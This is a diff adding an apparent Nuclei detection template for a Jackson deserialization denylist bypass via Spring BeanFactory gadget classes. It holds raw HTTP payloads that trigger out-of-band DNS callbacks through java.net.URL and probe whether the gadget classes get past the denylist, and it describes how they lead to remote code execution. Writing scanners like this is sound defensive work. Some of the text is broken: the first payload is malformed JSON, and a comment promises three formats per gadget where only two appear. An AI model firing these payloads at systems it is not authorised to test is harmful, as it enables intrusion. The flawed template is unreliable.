@@ -1,0 +1,222 @@
+id: spring-jackson-deserialization-denylist-bypass
+
+info:
+  name: Spring Jackson Deserialization Denylist Bypass (CVE-2020-11619 Incomplete Fix)
+  author: Rin Le from Secuwall (trinhtu.kma@gmail.com)
+  severity: high
+  description: |
+    Detects Jackson polymorphic deserialization denylist bypass via
+    Spring BeanFactory gadget classes.
+
+    SimpleBeanFactoryAwareAspectInstanceFactory and SimpleBeanTargetSource
+    use the same BeanFactoryAware → setBeanFactory() → getBean() pattern
+    as MethodLocatingFactoryBean (CVE-2020-11619), but are NOT in
+    Jackson's SubTypeValidator denylist.
+
+    Detection strategy (Option C — OOB + status-code differential):
+      Phase 1 — OOB DNS confirms default typing is enabled
+      Phase 2 — Status-code: denylist blocks MethodLocatingFactoryBean
+      Phase 3 — Status-code: gadget classes NOT blocked (bypass)
+
+    Phase 1 uses interactsh OOB via Jackson's polymorphic handling of
+    java.net.URL — DNS resolution fires during deserialization when
+    default typing is enabled, independent of response body.
+
+    Phase 2+3 compare HTTP status codes only — blocked classes return
+    4xx/5xx while bypassed classes return 200 (or a different error).
+    No response body parsing required.
+
+    setBeanFactory() only STORES the factory reference and does NOT
+    call getBean() during deserialization. RCE triggers when application
+    code later calls getTarget() or getOrder() on the deserialized object.
+
+    Preconditions:
+      - ObjectMapper.enableDefaultTyping(NON_FINAL) or @JsonTypeInfo(use=CLASS)
+      - spring-aop on classpath (default in Spring Boot)
+      - Endpoint deserializes untrusted JSON
+  impact: |
+    Remote Code Execution. The attacker-controlled BeanFactory is
+    injected during deserialization. When application code subsequently
+    calls getTarget() or getOrder(), the malicious BeanFactory executes
+    arbitrary commands via getBean().
+  reference:
+    - https://github.com/FasterXML/jackson-databind/commit/113e89fb08b1b6b072d60b3e4737ed407c13db9a
+  classification:
+    cve-id: CVE-2020-11619
+    cwe-id: CWE-502
+    cvss-score: 8.1
+    cvss-metrics: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H
+  tags: jackson,deserialization,rce,spring,denylist-bypass,oob
+  metadata:
+    max-request: 7
+
+# Phase 1 fires first via OOB. If DNS callback confirms default typing,
+# Phase 2+3 results (status-code differential) confirm the bypass.
+# Nuclei evaluates each request independently — all 3 phases contribute
+# to the finding. A match on ANY phase 3 request = bypass detected.
+
+http:
+  # ══════════════════════════════════════════════════════════════
+  # Phase 1: OOB — Confirm Jackson default typing is enabled
+  #
+  # Jackson with enableDefaultTyping(NON_FINAL) resolves type hints
+  # for all non-final classes. java.net.URL triggers DNS resolution
+  # during deserialization (in URL.hashCode() via HashMap internals).
+  #
+  # If interactsh receives a DNS callback → default typing is ON.
+  # This works regardless of response body content.
+  # ══════════════════════════════════════════════════════════════
+
+  # 1A — WRAPPER_ARRAY format: HashMap with URL key triggers hashCode → DNS
+  - raw:
+      - |
+        POST {{BaseURL}} HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+        Accept: */*
+
+        ["java.util.HashMap",{"["java.net.URL","http://{{interactsh-url}}"]":"probe"}]
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
+
+      - type: regex
+        part: interactsh_request
+        regex:
+          - ".*"
+
+  # 1B — Fallback: LinkedList with URL triggers URL.equals() → DNS
+  - raw:
+      - |
+        POST {{BaseURL}} HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+        Accept: */*
+
+        ["java.util.LinkedList",[["java.net.URL","http://{{interactsh-url}}"]]]
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
+
+      - type: regex
+        part: interactsh_request
+        regex:
+          - ".*"
+
+  # ══════════════════════════════════════════════════════════════
+  # Phase 2: Status-code — Confirm denylist is active
+  #
+  # MethodLocatingFactoryBean IS in Jackson's denylist (CVE-2020-11619).
+  # Jackson throws InvalidDefinitionException → app returns 4xx/5xx.
+  #
+  # If this returns 4xx/5xx, denylist is working.
+  # If this returns 200, denylist is broken (even worse — all classes
+  # are accepted, not just our bypass targets).
+  # ══════════════════════════════════════════════════════════════
+
+  - raw:
+      - |
+        POST {{BaseURL}} HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+        Accept: */*
+
+        ["org.springframework.aop.config.MethodLocatingFactoryBean",{"targetBeanName":"x","methodName":"x"}]
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 400
+          - 500
+
+  # ══════════════════════════════════════════════════════════════
+  # Phase 3: Status-code — Confirm denylist bypass
+  #
+  # These gadget classes share the same BeanFactoryAware pattern
+  # but are NOT in the denylist. If Jackson accepts them (status 200)
+  # while blocking MethodLocatingFactoryBean (status 4xx/5xx),
+  # the denylist bypass is confirmed.
+  #
+  # Minimal payloads — no beanFactory field. Just confirming the
+  # class passes the denylist check and gets instantiated.
+  #
+  # 3 JSON formats per gadget cover:
+  #   WRAPPER_ARRAY  — enableDefaultTyping() default
+  #   AS_PROPERTY    — activateDefaultTyping(..., As.PROPERTY)
+  #   WRAPPER_OBJECT — activateDefaultTyping(..., As.WRAPPER_OBJECT)
+  # ══════════════════════════════════════════════════════════════
+
+  # Gadget A: SimpleBeanFactoryAwareAspectInstanceFactory
+
+  # 3A-1 WRAPPER_ARRAY
+  - raw:
+      - |
+        POST {{BaseURL}} HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+        Accept: */*
+
+        ["org.springframework.aop.config.SimpleBeanFactoryAwareAspectInstanceFactory",{"aspectBeanName":"denylist-bypass-test"}]
+
+    matchers:
+      - type: status
+        status:
+          - 200
+
+  # 3A-2 AS_PROPERTY
+  - raw:
+      - |
+        POST {{BaseURL}} HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+        Accept: */*
+
+        {"@class":"org.springframework.aop.config.SimpleBeanFactoryAwareAspectInstanceFactory","aspectBeanName":"denylist-bypass-test"}
+
+    matchers:
+      - type: status
+        status:
+          - 200
+
+  # Gadget B: SimpleBeanTargetSource
+
+  # 3B-1 WRAPPER_ARRAY
+  - raw:
+      - |
+        POST {{BaseURL}} HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+        Accept: */*
+
+        ["org.springframework.aop.target.SimpleBeanTargetSource",{"targetBeanName":"denylist-bypass-test"}]
+
+    matchers:
+      - type: status
+        status:
+          - 200
+
+  # 3B-2 AS_PROPERTY
+  - raw:
+      - |
+        POST {{BaseURL}} HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+        Accept: */*
+
+        {"@class":"org.springframework.aop.target.SimpleBeanTargetSource","targetBeanName":"denylist-bypass-test"}
+
+    matchers:
+      - type: status
+        status:
+          - 200
+
+# yaml-language-server: $schema=https://raw.githubusercontent.com/projectdiscovery/nuclei/master/nuclei-jsonschema.json
